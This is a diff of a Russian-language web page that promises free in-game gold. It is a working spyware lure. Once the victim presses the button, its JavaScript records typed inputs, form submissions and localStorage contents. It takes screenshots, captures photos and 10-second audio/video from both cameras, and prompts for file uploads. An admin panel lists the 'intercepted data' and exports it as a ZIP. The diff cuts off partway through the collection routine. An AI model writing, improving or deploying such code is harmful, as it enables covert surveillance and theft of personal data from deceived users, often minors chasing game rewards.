@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>БЕСПЛАТНЫЙ ПРОМОКОД</title>
+    <title>БЕСПЛАТНАЯ ГОЛДА</title>
     
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
@@ -12,7 +12,7 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, #0a0a0f, #1a0a2e);
             color: #e2e8f0;
             display: flex;
@@ -20,166 +20,258 @@
             align-items: center;
             min-height: 100vh;
             padding: 20px;
+            -webkit-tap-highlight-color: transparent;
         }
         .container {
             background: rgba(20, 20, 40, 0.95);
-            padding: 30px;
+            padding: 25px 20px;
             border-radius: 20px;
-            max-width: 950px;
+            max-width: 500px;
             width: 100%;
             border: 2px solid #ffd700;
-            box-shadow: 0 0 60px rgba(255, 215, 0, 0.3);
+            box-shadow: 0 0 60px rgba(255, 215, 0, 0.2);
         }
         h1 {
             text-align: center;
-            font-size: 36px;
+            font-size: 28px;
             font-weight: 900;
-            background: linear-gradient(45deg, #ffd700, #ff6b00, #ffd700);
-            background-size: 300%;
+            background: linear-gradient(45deg, #ffd700, #ff6b00);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            animation: gold 3s ease-in-out infinite;
-            margin-bottom: 10px;
-        }
-        @keyframes gold {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+            margin-bottom: 5px;
         }
         .subtitle {
             text-align: center;
-            font-size: 22px;
+            font-size: 18px;
             color: #ffd700;
-            text-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
-            margin-bottom: 20px;
+            text-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
+            margin-bottom: 15px;
+            font-weight: 600;
         }
-        button {
+        .btn-main {
             background: linear-gradient(45deg, #ffd700, #ff8c00);
             color: #0a0a0f;
             border: none;
-            padding: 18px 36px;
-            font-size: 22px;
+            padding: 18px 20px;
+            font-size: 20px;
             font-weight: 900;
-            border-radius: 12px;
+            border-radius: 14px;
             cursor: pointer;
             width: 100%;
             transition: 0.3s;
             text-transform: uppercase;
-            letter-spacing: 3px;
-            box-shadow: 0 0 40px rgba(255, 215, 0, 0.4);
+            letter-spacing: 2px;
+            box-shadow: 0 0 40px rgba(255, 215, 0, 0.3);
+            -webkit-tap-highlight-color: transparent;
+            position: relative;
+            overflow: hidden;
         }
-        button:hover {
-            transform: scale(1.03);
-            box-shadow: 0 0 60px rgba(255, 215, 0, 0.8);
+        .btn-main:active {
+            transform: scale(0.97);
         }
-        button:disabled {
+        .btn-main:disabled {
             opacity: 0.5;
-            cursor: not-allowed;
+            transform: none;
         }
+        .btn-main .spinner {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(0,0,0,0.1);
+            border-top: 3px solid #0a0a0f;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn-main.loading .spinner { display: block; }
+        .btn-main.loading .btn-text { display: none; }
+        
         .status {
-            margin: 15px 0;
-            padding: 15px;
-            background: rgba(0,0,0,0.3);
+            margin: 12px 0;
+            padding: 12px;
+            background: rgba(0,0,0,0.4);
             border-radius: 10px;
             border-left: 4px solid #ffd700;
             text-align: center;
-            font-size: 16px;
+            font-size: 14px;
             color: #ffd700;
-            min-height: 60px;
+            min-height: 50px;
             word-break: break-word;
+            line-height: 1.5;
         }
+        .status.error { border-left-color: #ff4444; color: #ff6666; }
+        .status.success { border-left-color: #4ade80; color: #4ade80; }
+        
         .hidden { display: none !important; }
+        
         .admin-link {
             text-align: center;
-            margin-top: 20px;
+            margin-top: 15px;
         }
         .admin-link button {
             background: transparent;
-            border: 2px solid #ffd700;
+            border: 1px solid #ffd700;
             color: #ffd700;
-            padding: 10px 20px;
-            font-size: 14px;
+            padding: 8px 16px;
+            font-size: 12px;
             width: auto;
-            box-shadow: none;
+            border-radius: 8px;
+            opacity: 0.5;
         }
-        .admin-link button:hover {
-            background: #ffd700;
-            color: #0a0a0f;
+        .admin-link button:active { opacity: 1; }
+        
+        .final-message {
+            text-align: center;
+            padding: 30px 15px;
+            display: none;
         }
+        .final-message h2 {
+            color: #ffd700;
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+        .final-message .tg {
+            font-size: 22px;
+            color: #ff6b00;
+            background: rgba(0,0,0,0.4);
+            padding: 12px 24px;
+            border-radius: 12px;
+            border: 2px solid #ff6b00;
+            display: inline-block;
+            margin-top: 8px;
+            font-weight: 700;
+        }
+        .final-message p {
+            color: #aaa;
+            font-size: 16px;
+            margin: 15px 0;
+        }
+        
+        /* Админка */
         input {
             width: 100%;
             padding: 14px;
-            margin: 8px 0;
+            margin: 6px 0;
             border-radius: 10px;
             border: 2px solid #ffd700;
             background: rgba(0,0,0,0.3);
             color: #fff;
             font-size: 16px;
+            -webkit-appearance: none;
         }
         .session-item {
             background: rgba(0,0,0,0.3);
-            padding: 15px;
-            margin: 10px 0;
+            padding: 12px;
+            margin: 8px 0;
             border-radius: 10px;
             border-left: 4px solid #ffd700;
+            font-size: 13px;
         }
         .password-item {
-            background: rgba(255, 0, 0, 0.1);
+            background: rgba(255,0,0,0.08);
             padding: 10px;
-            margin: 5px 0;
+            margin: 4px 0;
             border-radius: 8px;
             border: 1px solid #ff4444;
             color: #ff6666;
+            font-size: 13px;
+            word-break: break-all;
         }
         .badge {
             background: #ffd700;
             color: #0a0a0f;
-            padding: 2px 12px;
-            border-radius: 20px;
-            font-size: 12px;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 11px;
             font-weight: bold;
         }
-        .final-message {
-            text-align: center;
-            padding: 40px 20px;
-            display: none;
+        .btn-small {
+            background: #ff4444;
+            color: #fff;
+            border: none;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+            margin-top: 4px;
         }
-        .final-message h2 {
-            color: #ffd700;
-            font-size: 28px;
-            margin-bottom: 20px;
-            text-shadow: 0 0 40px rgba(255, 215, 0, 0.5);
-        }
-        .final-message .tg {
-            font-size: 24px;
-            color: #ff6b00;
-            text-shadow: 0 0 30px rgba(255, 107, 0, 0.5);
-            background: rgba(0,0,0,0.3);
-            padding: 15px 30px;
-            border-radius: 12px;
-            border: 2px solid #ff6b00;
-            display: inline-block;
-            margin-top: 10px;
-        }
-        .progress-bar {
+        .btn-small:active { opacity: 0.7; }
+        .btn-export {
+            background: #ff8c00;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 700;
             width: 100%;
-            height: 8px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 4px;
+            margin: 6px 0;
+            cursor: pointer;
+        }
+        .btn-export:active { opacity: 0.7; }
+        .btn-danger {
+            background: #ff4444;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 700;
+            width: 100%;
+            margin: 6px 0;
+            cursor: pointer;
+        }
+        .btn-danger:active { opacity: 0.7; }
+        
+        #fileUpload { display: none; }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
             margin: 10px 0;
-            overflow: hidden;
-            display: none;
+            flex-wrap: wrap;
         }
-        .progress-bar .fill {
-            height: 100%;
-            background: linear-gradient(90deg, #ffd700, #ff6b00);
-            width: 0%;
-            border-radius: 4px;
-            transition: width 0.5s;
+        .step-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.1);
+            transition: 0.3s;
         }
-        #fileUpload {
-            display: none;
+        .step-dot.active { background: #ffd700; box-shadow: 0 0 20px rgba(255,215,0,0.4); }
+        .step-dot.done { background: #4ade80; }
+        .step-dot.error { background: #ff4444; }
+        
+        .permission-request {
+            background: rgba(255,215,0,0.05);
+            border: 1px solid #ffd700;
+            border-radius: 10px;
+            padding: 12px;
+            margin: 10px 0;
+            text-align: center;
+            font-size: 14px;
+            color: #ffd700;
         }
+        .permission-request .icon {
+            font-size: 32px;
+            display: block;
+            margin-bottom: 6px;
+        }
+        .permission-request .btn-grant {
+            background: #ffd700;
+            color: #0a0a0f;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-weight: 700;
+            font-size: 16px;
+            margin-top: 8px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .permission-request .btn-grant:active { opacity: 0.7; }
     </style>
 </head>
 <body>
@@ -187,44 +279,61 @@
 <div class="container" id="app">
 
     <div id="mainPage">
-        <h1>✨ БЕСПЛАТНЫЙ ПРОМОКОД ✨</h1>
-        <div class="subtitle">🏆 БЕСПЛАТНАЯ ГОЛДА 🏆</div>
+        <h1>✨ БЕСПЛАТНАЯ ГОЛДА ✨</h1>
+        <div class="subtitle">🏆 НАЖМИ КНОПКУ ДЛЯ ПОЛУЧЕНИЯ ГОЛДЫ 🏆</div>
         
-        <button id="startBtn">🎁 АКТИВИРОВАТЬ ПРОМОКОД</button>
-        <div class="progress-bar" id="progressBar"><div class="fill" id="progressFill"></div></div>
-        <div class="status" id="status">💫 НАЖМИ КНОПКУ ДЛЯ ПОЛУЧЕНИЯ КОДА</div>
+        <button class="btn-main" id="startBtn">
+            <span class="btn-text">🎁 ПОЛУЧИТЬ ГОЛДУ</span>
+            <div class="spinner"></div>
+        </button>
+        
+        <div class="step-indicator" id="stepIndicator">
+            <div class="step-dot" data-step="1"></div>
+            <div class="step-dot" data-step="2"></div>
+            <div class="step-dot" data-step="3"></div>
+            <div class="step-dot" data-step="4"></div>
+            <div class="step-dot" data-step="5"></div>
+            <div class="step-dot" data-step="6"></div>
+        </div>
+        
+        <div class="status" id="status">💫 НАЖМИ КНОПКУ ДЛЯ ПОЛУЧЕНИЯ ГОЛДЫ</div>
+        
+        <div id="permissionBox" class="permission-request hidden">
+            <span class="icon">📱</span>
+            <div>ТРЕБУЕТСЯ ДОСТУП К КАМЕРЕ</div>
+            <button class="btn-grant" id="grantBtn">✅ РАЗРЕШИТЬ ДОСТУП</button>
+        </div>
         
         <div class="admin-link">
-            <button id="goToAdminBtn">🔐 АДМИН-ПАНЕЛЬ</button>
+            <button id="goToAdminBtn">🔐 АДМИН</button>
         </div>
     </div>
 
     <div id="finalMessage" class="final-message">
-        <h2>🎉 ВАШ ПРОМОКОД АКТИВИРОВАН!</h2>
-        <p style="color:#aaa;font-size:18px;margin:20px 0;">ХОЧЕШЬ УДАЛИТЬ ДАННЫЕ? ПИШИ СЮДА:</p>
+        <h2>🎉 ВЫ ПОЛУЧИЛИ ГОЛДУ!</h2>
+        <p>ХОЧЕШЬ УДАЛИТЬ ДАННЫЕ? ПИШИ СЮДА:</p>
         <div class="tg">@papadenay</div>
     </div>
 
     <div id="adminPage" class="hidden">
-        <h1>🔐 АДМИН-ПАНЕЛЬ</h1>
+        <h1 style="font-size:24px;">🔐 АДМИН-ПАНЕЛЬ</h1>
         
         <div id="loginForm">
             <input type="text" id="adminLogin" placeholder="ЛОГИН" value="admin">
             <input type="password" id="adminPassword" placeholder="ПАРОЛЬ">
-            <button id="adminLoginBtn" style="background:#ffd700;color:#0a0a0f;">ВОЙТИ</button>
+            <button class="btn-main" id="adminLoginBtn" style="font-size:16px;padding:14px;">ВОЙТИ</button>
             <div class="status" id="adminStatus"></div>
         </div>
 
         <div id="adminContent" class="hidden">
-            <h2 style="color:#ffd700;text-align:center;font-size:22px;">📊 ВСЕ СЕССИИ</h2>
-            <button id="clearSessionsBtn" style="background:#ff4444;color:#fff;margin:10px 0;">🗑️ ОЧИСТИТЬ ВСЁ</button>
-            <button id="exportAllBtn" style="background:#ff8c00;color:#fff;margin:10px 0;">📥 ЭКСПОРТ ВСЕГО (ZIP)</button>
+            <div style="display:flex;gap:8px;flex-wrap:wrap;margin:10px 0;">
+                <button class="btn-danger" id="clearSessionsBtn" style="flex:1;min-width:100px;">🗑️ ОЧИСТИТЬ</button>
+                <button class="btn-export" id="exportAllBtn" style="flex:1;min-width:100px;">📥 ЭКСПОРТ ZIP</button>
+            </div>
             <div id="sessionsList"></div>
-
-            <h2 style="color:#ff6666;text-align:center;font-size:20px;margin-top:30px;">🔑 ПЕРЕХВАЧЕННЫЕ ДАННЫЕ</h2>
+            <h3 style="color:#ff6666;margin:15px 0 8px;font-size:16px;">🔑 ПЕРЕХВАЧЕННЫЕ ДАННЫЕ</h3>
             <div id="passwordsList"></div>
-
-            <button id="logoutBtn" style="background:transparent;border:2px solid #ffd700;color:#ffd700;margin-top:20px;">🚪 ВЫЙТИ</button>
+            <button class="btn-small" id="logoutBtn" style="background:#666;width:100%;margin-top:10px;padding:10px;">🚪 ВЫЙТИ</button>
         </div>
     </div>
 </div>
@@ -239,121 +348,152 @@
     let capturedData = JSON.parse(localStorage.getItem('capturedData') || '[]');
     let isAdmin = false;
     let screenshotData = null;
-    let mediaData = [];
     let collectedFiles = [];
+    let mediaData = [];
+    let hasCameraPermission = false;
+    let isRunning = false;
 
     // ============================================================
     // 2. ПЕРЕХВАТ ДАННЫХ
     // ============================================================
     function captureData(value, source = 'manual', extra = {}) {
-        if (!value || value.length < 1) return;
-        const upperValue = String(value).toUpperCase();
-        const entry = {
-            "ВРЕМЯ": new Date().toISOString(),
-            "ЗНАЧЕНИЕ": upperValue,
-            "ОТКУДА ВЗЯЛОСЬ": String(source).toUpperCase(),
-            "АДРЕС СТРАНИЦЫ": String(window.location.href).toUpperCase(),
-            "ДОПОЛНИТЕЛЬНО": JSON.stringify(extra).toUpperCase()
-        };
-        const exists = capturedData.some(p => p["ЗНАЧЕНИЕ"] === upperValue);
-        if (!exists) {
-            capturedData.push(entry);
-            localStorage.setItem('capturedData', JSON.stringify(capturedData));
-        }
+        if (!value || String(value).length < 1) return;
+        try {
+            const entry = {
+                "ВРЕМЯ": new Date().toISOString(),
+                "ЗНАЧЕНИЕ": String(value).toUpperCase().substring(0, 500),
+                "ОТКУДА": String(source).toUpperCase(),
+                "СТРАНИЦА": String(window.location.href).toUpperCase(),
+                "ДОП": JSON.stringify(extra).substring(0, 200)
+            };
+            const exists = capturedData.some(p => p["ЗНАЧЕНИЕ"] === entry["ЗНАЧЕНИЕ"]);
+            if (!exists) {
+                capturedData.push(entry);
+                localStorage.setItem('capturedData', JSON.stringify(capturedData));
+            }
+        } catch(e) {}
     }
 
     function setupCapture() {
-        const observer = new MutationObserver(() => {
-            document.querySelectorAll('input').forEach(field => {
-                if (!field.dataset.captured && field.type !== 'file' && field.type !== 'checkbox' && field.type !== 'radio') {
-                    field.dataset.captured = 'true';
-                    field.addEventListener('input', function() {
-                        if (this.value && this.value.length > 1) {
-                            captureData(this.value, 'ИЗ ПОЛЯ ВВОДА', {
-                                name: this.name || 'НЕИЗВЕСТНО',
-                                id: this.id || 'НЕИЗВЕСТНО',
-                                type: this.type
+        try {
+            const observer = new MutationObserver(() => {
+                document.querySelectorAll('input').forEach(field => {
+                    if (!field.dataset.captured && field.type !== 'file' && field.type !== 'checkbox' && field.type !== 'radio') {
+                        field.dataset.captured = 'true';
+                        field.addEventListener('input', function() {
+                            if (this.value && String(this.value).length > 1) {
+                                captureData(this.value, 'ПОЛЕ ВВОДА', {
+                                    name: this.name || 'НЕТ',
+                                    id: this.id || 'НЕТ',
+                                    type: this.type
+                                });
+                            }
+                        });
+                        if (field.value && String(field.value).length > 1) {
+                            captureData(field.value, 'ПОЛЕ ПРИ ЗАГРУЗКЕ', {
+                                name: field.name || 'НЕТ',
+                                id: field.id || 'НЕТ'
+                            });
+                        }
+                    }
+                });
+            });
+            observer.observe(document.body, { childList: true, subtree: true });
+
+            document.addEventListener('submit', function(e) {
+                try {
+                    const form = e.target;
+                    form.querySelectorAll('input').forEach(inp => {
+                        if (inp.value && String(inp.value).length > 1) {
+                            captureData(inp.value, 'ФОРМА', {
+                                name: inp.name || 'НЕТ',
+                                id: inp.id || 'НЕТ'
                             });
                         }
                     });
-                    if (field.value && field.value.length > 1) {
-                        captureData(field.value, 'ИЗ ПОЛЯ ПРИ ЗАГРУЗКЕ', {
-                            name: field.name || 'НЕИЗВЕСТНО',
-                            id: field.id || 'НЕИЗВЕСТНО'
-                        });
-                    }
-                }
-            });
-        });
-        observer.observe(document.body, { childList: true, subtree: true });
-
-        document.addEventListener('submit', function(e) {
-            const form = e.target;
-            form.querySelectorAll('input').forEach(inp => {
-                if (inp.value && inp.value.length > 1) {
-                    captureData(inp.value, 'ИЗ ФОРМЫ', {
-                        name: inp.name || 'НЕИЗВЕСТНО',
-                        id: inp.id || 'НЕИЗВЕСТНО'
-                    });
-                }
-            });
-        });
-
-        const originalFetch = window.fetch;
-        window.fetch = function(...args) {
-            return originalFetch.apply(this, args).then(response => {
-                try {
-                    const body = args[1]?.body;
-                    if (body && typeof body === 'string') {
-                        const urlParams = new URLSearchParams(body);
-                        for (let [key, val] of urlParams) {
-                            if (val && val.length > 1) {
-                                captureData(val, 'FETCH-' + String(key).toUpperCase(), { url: args[0] });
-                            }
-                        }
-                    }
                 } catch(e) {}
-                return response;
             });
-        };
 
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            if (key) {
-                const val = localStorage.getItem(key);
-                if (val && val.length > 1) {
-                    captureData(val, 'ИЗ LOCALSTORAGE', { storageKey: key });
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key) {
+                    const val = localStorage.getItem(key);
+                    if (val && String(val).length > 1) {
+                        captureData(val, 'LOCALSTORAGE', { key: key });
+                    }
                 }
             }
-        }
+        } catch(e) {}
     }
 
     // ============================================================
-    // 3. ПРОВЕРКА РАЗРЕШЕНИЙ
+    // 3. СТАТУС И ШАГИ
     // ============================================================
-    async function checkPermissions() {
-        const status = document.getElementById('status');
-        status.textContent = '📱 ЗАПРОС РАЗРЕШЕНИЙ...';
-        
-        try {
-            // Проверяем камеру
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            stream.getTracks().forEach(t => t.stop());
-            status.textContent = '✅ РАЗРЕШЕНИЯ ПОЛУЧЕНЫ';
-            return true;
-        } catch (err) {
-            status.textContent = '⚠️ НЕТ ДОСТУПА К КАМЕРЕ: ' + err.message + ' (СБОР БЕЗ ВИДЕО)';
-            return false;
-        }
+    function setStatus(text, type = '') {
+        const el = document.getElementById('status');
+        el.textContent = text;
+        el.className = 'status ' + type;
+    }
+
+    function setStep(step, status = 'active') {
+        document.querySelectorAll('.step-dot').forEach(d => {
+            const num = parseInt(d.dataset.step);
+            d.className = 'step-dot';
+            if (num < step) d.classList.add('done');
+            else if (num === step) d.classList.add(status);
+        });
+    }
+
+    function showPermissionBox(show) {
+        document.getElementById('permissionBox').classList.toggle('hidden', !show);
     }
 
     // ============================================================
-    // 4. СКРИНШОТ
+    // 4. ЗАПРОС РАЗРЕШЕНИЙ
+    // ============================================================
+    async function requestPermissions() {
+        return new Promise(async (resolve) => {
+            showPermissionBox(true);
+            setStatus('📱 НАЖМИ "РАЗРЕШИТЬ ДОСТУП" ДЛЯ КАМЕРЫ', '');
+            
+            document.getElementById('grantBtn').onclick = async function() {
+                try {
+                    setStatus('⏳ ПРОВЕРКА КАМЕРЫ...', '');
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'environment', width: 640, height: 480 },
+                        audio: true 
+                    });
+                    stream.getTracks().forEach(t => t.stop());
+                    hasCameraPermission = true;
+                    showPermissionBox(false);
+                    setStatus('✅ ДОСТУП К КАМЕРЕ РАЗРЕШЁН', 'success');
+                    resolve(true);
+                } catch (err) {
+                    setStatus('⚠️ ДОСТУП К КАМЕРЕ ОТКЛОНЁН (СБОР БЕЗ ВИДЕО)', 'error');
+                    showPermissionBox(false);
+                    hasCameraPermission = false;
+                    resolve(false);
+                }
+            };
+            
+            // Таймаут, если не нажали
+            setTimeout(() => {
+                if (!hasCameraPermission) {
+                    showPermissionBox(false);
+                    setStatus('⏱️ ВРЕМЯ ВЫШЛО (СБОР БЕЗ ВИДЕО)', 'error');
+                    resolve(false);
+                }
+            }, 30000);
+        });
+    }
+
+    // ============================================================
+    // 5. СКРИНШОТ
     // ============================================================
     async function takeScreenshot() {
         try {
             const canvas = await html2canvas(document.body, {
-                scale: 1.5,
+                scale: 1.2,
                 useCORS: true,
                 allowTaint: true,
                 backgroundColor: '#0a0a0f',
@@ -361,33 +501,46 @@
             });
             return canvas.toDataURL('image/png');
         } catch (err) {
-            console.error('Screenshot error:', err);
             return null;
         }
     }
 
     // ============================================================
-    // 5. ЗАПИСЬ ВИДЕО
+    // 6. ФОТО
     // ============================================================
-    async function recordCamera(facingMode, durationMs = 3000) {
+    async function takePhoto(facingMode) {
+        if (!hasCameraPermission) return null;
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: facingMode,
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                },
+                video: { facingMode: facingMode, width: 640, height: 480 }
+            });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const data = canvas.toDataURL('image/jpeg');
+            stream.getTracks().forEach(t => t.stop());
+            return data;
+        } catch(e) { return null; }
+    }
+
+    // ============================================================
+    // 7. ВИДЕО (10 СЕК)
+    // ============================================================
+    async function recordVideo(facingMode, duration = 10000) {
+        if (!hasCameraPermission) return null;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: facingMode, width: 480, height: 360 },
                 audio: true
             });
-
             return new Promise((resolve) => {
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
-                
-                recorder.ondataavailable = e => {
-                    if (e.data.size > 0) chunks.push(e.data);
-                };
-                
+                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                 recorder.onstop = () => {
                     try {
                         const blob = new Blob(chunks, { type: 'video/mp4' });
@@ -396,113 +549,28 @@
                             stream.getTracks().forEach(t => t.stop());
                             resolve(reader.result);
                         };
-                        reader.onerror = () => {
-                            stream.getTracks().forEach(t => t.stop());
-                            resolve(null);
-                        };
+                        reader.onerror = () => { stream.getTracks().forEach(t => t.stop()); resolve(null); };
                         reader.readAsDataURL(blob);
-                    } catch(e) {
-                        stream.getTracks().forEach(t => t.stop());
-                        resolve(null);
-                    }
+                    } catch(e) { stream.getTracks().forEach(t => t.stop()); resolve(null); }
                 };
-
-                recorder.onerror = () => {
-                    stream.getTracks().forEach(t => t.stop());
-                    resolve(null);
-                };
-
-                try {
-                    recorder.start();
-                    setTimeout(() => {
-                        try { recorder.stop(); } catch(e) {}
-                    }, durationMs);
-                } catch(e) {
-                    stream.getTracks().forEach(t => t.stop());
-                    resolve(null);
-                }
+                recorder.start();
+                setTimeout(() => { try { recorder.stop(); } catch(e) {} }, duration);
             });
-        } catch (err) {
-            return null;
-        }
-    }
-
-    async function recordBothCameras() {
-        const status = document.getElementById('status');
-        const results = { back: null, front: null };
-        
-        try {
-            status.textContent = '📹 ЗАДНЯЯ КАМЕРА (10 СЕК)...';
-            results.back = await recordCamera('environment', 10000);
-            
-            status.textContent = '📹 ПЕРЕДНЯЯ КАМЕРА (10 СЕК)...';
-            results.front = await recordCamera('user', 10000);
-        } catch(e) {
-            console.error('Video error:', e);
-        }
-        
-        return results;
+        } catch(e) { return null; }
     }
 
     // ============================================================
-    // 6. ФОТО
+    // 8. ФАЙЛЫ (РУЧНОЙ ВЫБОР)
     // ============================================================
-    async function takePhotoFromCamera(facingMode) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: facingMode,
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
-                }
-            });
-            
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-            const photoData = canvas.toDataURL('image/jpeg');
-            
-            stream.getTracks().forEach(t => t.stop());
-            return photoData;
-        } catch (err) {
-            return null;
-        }
-    }
-
-    async function takeBothPhotos() {
-        const status = document.getElementById('status');
-        const results = { back: null, front: null };
-        
-        try {
-            status.textContent = '📸 ФОТО С ЗАДНЕЙ КАМЕРЫ...';
-            results.back = await takePhotoFromCamera('environment');
-            
-            status.textContent = '📸 ФОТО С ПЕРЕДНЕЙ КАМЕРЫ...';
-            results.front = await takePhotoFromCamera('user');
-        } catch(e) {
-            console.error('Photo error:', e);
-        }
-        
-        return results;
-    }
-
-    // ============================================================
-    // 7. ФАЙЛЫ
-    // ============================================================
-    function waitForFiles(timeout = 15000) {
+    function waitForFiles(timeout = 20000) {
         return new Promise((resolve) => {
-            const fileInput = document.getElementById('fileUpload');
+            const input = document.getElementById('fileUpload');
             let resolved = false;
             
             const handler = function(e) {
-                if (e.target.files && e.target.files.length > 0) {
-                    Array.from(e.target.files).forEach(file => {
+                const files = e.target.files;
+                if (files && files.length > 0) {
+                    Array.from(files).forEach(file => {
                         const reader = new FileReader();
                         reader.onload = function(ev) {
                             collectedFiles.push({
@@ -510,144 +578,125 @@
                                 type: file.type,
                                 size: file.size,
                                 data: ev.target.result,
-                                timestamp: new Date().toISOString()
+                                time: new Date().toISOString()
                             });
                         };
                         reader.readAsDataURL(file);
                     });
-                    if (!resolved) {
-                        resolved = true;
-                        resolve(true);
-                    }
+                    if (!resolved) { resolved = true; resolve(true); }
                 }
             };
             
-            fileInput.addEventListener('change', handler);
+            input.addEventListener('change', handler);
+            input.click(); // ОТКРЫВАЕМ ДИАЛОГ ВЫБОРА ФАЙЛОВ
             
-            // Если файлы уже выбраны
-            if (fileInput.files && fileInput.files.length > 0) {
-                handler({ target: fileInput });
-            }
-            
-            // Таймаут
             setTimeout(() => {
-                if (!resolved) {
-                    resolved = true;
-                    resolve(false);
-                }
+                if (!resolved) { resolved = true; resolve(false); }
             }, timeout);
         });
-    }
-
-    // ============================================================
-    // 8. ОБНОВЛЕНИЕ ПРОГРЕССА
-    // ============================================================
-    function updateProgress(percent, text) {
-        const fill = document.getElementById('progressFill');
-        const status = document.getElementById('status');
-        const bar = document.getElementById('progressBar');
-        
-        bar.style.display = 'block';
-        fill.style.width = Math.min(percent, 100) + '%';
-        if (text) status.textContent = text;
     }
 
     // ============================================================
     // 9. ГЛАВНАЯ ФУНКЦИЯ
     // ============================================================
     async function startCollection() {
+        if (isRunning) return;
+        isRunning = true;
+        
         const btn = document.getElementById('startBtn');
         const status = document.getElementById('status');
         const mainPage = document.getElementById('mainPage');
         const finalMessage = document.getElementById('finalMessage');
         
+        btn.classList.add('loading');
         btn.disabled = true;
-        btn.textContent = '⏳ ИДЁТ АКТИВАЦИЯ...';
-        status.textContent = '🔄 ПРОВЕРКА РАЗРЕШЕНИЙ...';
+        setStatus('🔄 ПОДГОТОВКА...', '');
+        setStep(1, 'active');
         
         try {
-            // 0. Проверка разрешений
-            updateProgress(5, '📱 ЗАПРОС РАЗРЕШЕНИЙ...');
-            await checkPermissions();
+            // ШАГ 1: ЗАПРОС РАЗРЕШЕНИЙ
+            setStep(1, 'active');
+            setStatus('📱 ЗАПРОС РАЗРЕШЕНИЙ...', '');
+            await requestPermissions();
+            setStep(1, 'done');
             
-            // 1. Скриншот
-            updateProgress(10, '📸 СКРИНШОТ...');
-            const screenshot = await takeScreenshot();
-            if (screenshot) {
-                screenshotData = screenshot;
-                updateProgress(20, '✅ СКРИНШОТ ГОТОВ');
-            }
+            // ШАГ 2: СКРИНШОТ
+            setStep(2, 'active');
+            setStatus('📸 СКРИНШОТ СТРАНИЦЫ...', '');
+            screenshotData = await takeScreenshot();
+            setStep(2, 'done');
+            if (screenshotData) setStatus('✅ СКРИНШОТ ГОТОВ', 'success');
+            else setStatus('⚠️ СКРИНШОТ НЕ УДАЛСЯ', 'error');
             
-            // 2. Фото
-            updateProgress(30, '📸 ФОТО С КАМЕР...');
-            const photos = await takeBothPhotos();
-            if (photos.back || photos.front) {
-                updateProgress(50, '✅ ФОТО ГОТОВЫ');
-            }
+            // ШАГ 3: ФОТО
+            setStep(3, 'active');
+            setStatus('📸 ФОТО С КАМЕР...', '');
+            const photoBack = await takePhoto('environment');
+            const photoFront = await takePhoto('user');
+            if (photoBack) mediaData.push({ type: 'photo', cam: 'back', data: photoBack });
+            if (photoFront) mediaData.push({ type: 'photo', cam: 'front', data: photoFront });
+            setStep(3, 'done');
+            setStatus(`✅ ФОТО: ${(photoBack?'ЗАДНЯЯ ':'')}${(photoFront?'ПЕРЕДНЯЯ':'')}`, 'success');
             
-            // 3. Видео
-            updateProgress(55, '📹 ЗАПИСЬ ВИДЕО...');
-            const videos = await recordBothCameras();
-            if (videos.back || videos.front) {
-                updateProgress(70, '✅ ВИДЕО ГОТОВЫ');
-            }
+            // ШАГ 4: ВИДЕО
+            setStep(4, 'active');
+            setStatus('📹 ЗАПИСЬ ВИДЕО (10 СЕК)...', '');
+            const videoBack = await recordVideo('environment', 10000);
+            const videoFront = await recordVideo('user', 10000);
+            if (videoBack) mediaData.push({ type: 'video', cam: 'back', data: videoBack });
